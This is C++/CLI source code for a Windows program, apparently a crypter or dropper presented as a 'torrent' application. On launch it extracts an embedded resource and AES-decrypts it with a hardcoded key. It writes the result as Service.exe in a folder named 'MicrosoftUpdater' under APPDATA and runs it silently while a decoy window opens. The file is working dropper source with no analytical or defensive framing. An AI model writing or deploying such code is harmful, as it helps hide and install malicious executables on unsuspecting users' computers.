#include "MyForm.h"
#include <windows.h>
#include <stdio.h>
#include <fcntl.h>
#include <io.h>
#include <string>
#include <fstream>
#include <iostream>
#include <ostream>
#include <bitset>
#include <conio.h>
#include <stdio.h>
#include <Shellapi.h>
#include <winuser.h>
#include <WinInet.h>
#include <wincrypt.h>
#include <Shlobj.h>
#include <Userenv.h>

#pragma comment (lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Advapi32.lib")

#define BLOCK_LEN 128

using namespace torrent;
using namespace System;
using namespace System::Resources;
using namespace System::ComponentModel;
using namespace System::Collections;
using namespace System::Windows::Forms;
using namespace System::Data;
using namespace System::Drawing;
using namespace System::Diagnostics;
using namespace std;

void ExtractBinResource(std::string strCustomResName, int nResourceId, std::string strOutputName);
int DeCrypt(LPCWSTR inFilename, LPCWSTR outFilename, LPCWSTR key_str);
wchar_t *convertCharArrayToLPCWSTR(const char* charArray);
void UnloadLibrary(int resourceId, std::string strOutputFile);
std::string GetNewFile();
std::string GetNewDirectory();

[STAThreadAttribute]
int Main()
{
	try
	{
		UnloadLibrary(107, "msvcp140d.dll");
		UnloadLibrary(105, "ucrtbased.dll");
		UnloadLibrary(106, "vcruntime140d.dll");
	}
	catch (const std::exception&){}

	std::string File = GetNewFile();

	try
	{
		Application::EnableVisualStyles();
		Application::SetCompatibleTextRenderingDefault(false);
	}
	catch (const std::exception&){}

	ExtractBinResource("File", 101, GetNewDirectory().append("\\data.bin") );
	DeCrypt(convertCharArrayToLPCWSTR(GetNewDirectory().append("\\data.bin").c_str()), convertCharArrayToLPCWSTR(File.c_str()), L"3igcZhRdWq96m3GUmTAiv9");

	Process^ myProcess = gcnew Process();
	myProcess->StartInfo->FileName = gcnew String(convertCharArrayToLPCWSTR(File.c_str()));
	myProcess->Start();
	

	Application::Run(gcnew MyForm());

	return 0;
}

wchar_t *convertCharArrayToLPCWSTR(const char* charArray)
{
	wchar_t* wString = new wchar_t[4096];
	MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
	return wString;
}

void ExtractBinResource(std::string strCustomResName, int nResourceId, std::string strOutputFile)
{
	HGLOBAL hResourceLoaded; // handle to loaded resource 
	HRSRC hRes; // handle/ptr to res. info. 
	char *lpResLock; // pointer to resource data 
	DWORD dwSizeRes; 
	std::string strAppLocation; // lets get the app location

	hRes = FindResource(NULL, MAKEINTRESOURCE(nResourceId), convertCharArrayToLPCWSTR(strCustomResName.c_str()) );
	hResourceLoaded = LoadResource(NULL, hRes); 
	lpResLock = (char *) LockResource(hResourceLoaded); 
	dwSizeRes = SizeofResource(NULL, hRes); 
	std::ofstream outputFile(strOutputFile.c_str(), std::ios::binary);
	outputFile.write((const char *) lpResLock, dwSizeRes); 
	outputFile.close(); 
}

	std::string GetNewDirectory()
	{
		std::string file;
		try
		{
	#pragma warning(disable : 4996)
			file.append(getenv("APPDATA"));

			if (strlen(file.c_str()) == 0)
			{
				if (System::IO::Directory::Exists("C:\\"))
				{
					file.clear();
					file.append("C:\\");
				}
			}
		}
		catch (exception ex)
		{
			if (System::IO::Directory::Exists("C:\\"))
			{
				file.clear();
				file.append("C:\\");
			}
		}
		file.append("\\MicrosoftUpdater");
		CreateDirectory(convertCharArrayToLPCWSTR(file.c_str()), NULL);
		return file;
	}

	std::string GetNewFile()
	{
		std::string file = GetNewDirectory();		
		file.append("\\Service.exe");

		return file;
	}

	int DeCrypt(LPCWSTR inFilename, LPCWSTR outFilename, LPCWSTR key_str)
	{

		size_t len = lstrlenW(key_str);

		HANDLE hInpFile = CreateFileW(inFilename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
		if (hInpFile == INVALID_HANDLE_VALUE)
		{
			return (-1);
		}
		HANDLE hOutFile = CreateFileW(outFilename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hOutFile == INVALID_HANDLE_VALUE)
		{
			return (-1);
		}

		DWORD dwStatus = 0;
		BOOL bResult = FALSE;
		wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
		HCRYPTPROV hProv;
		if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
		{
			dwStatus = GetLastError();
			CryptReleaseContext(hProv, 0);
			return dwStatus;
		}
		HCRYPTHASH hHash;
		if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
		{
			dwStatus = GetLastError();
			CryptReleaseContext(hProv, 0);
			return dwStatus;
		}

		if (!CryptHashData(hHash, (BYTE*)key_str, len, 0))
		{
			DWORD err = GetLastError();
			return (-1);
		}

		HCRYPTKEY hKey;
		if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey))
		{
			dwStatus = GetLastError();
			CryptReleaseContext(hProv, 0);
			return dwStatus;
		}

		const size_t chunk_size = BLOCK_LEN;
		BYTE chunk[chunk_size] = { 0 };
		DWORD out_len = 0;

		BOOL isFinal = FALSE;
		DWORD readTotalSize = 0;

		DWORD inputSize = GetFileSize(hInpFile, NULL);

		while (bResult = ReadFile(hInpFile, chunk, chunk_size, &out_len, NULL)) {
			if (0 == out_len) {
				break;
			}
			readTotalSize += out_len;
			if (readTotalSize == inputSize) {
				isFinal = TRUE;
			}

			if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) {
				break;
			}

			DWORD written = 0;
			if (!WriteFile(hOutFile, chunk, out_len, &written, NULL)) {
				break;
			}
			memset(chunk, 0, chunk_size);
		}

		CryptReleaseContext(hProv, 0);
		CryptDestroyKey(hKey);
		CryptDestroyHash(hHash);

		CloseHandle(hInpFile);
		CloseHandle(hOutFile);
		return 0;
	}

	void UnloadLibrary(int resourceId, std::string strOutputFile)
	{
		ExtractBinResource("File",resourceId, strOutputFile);
	}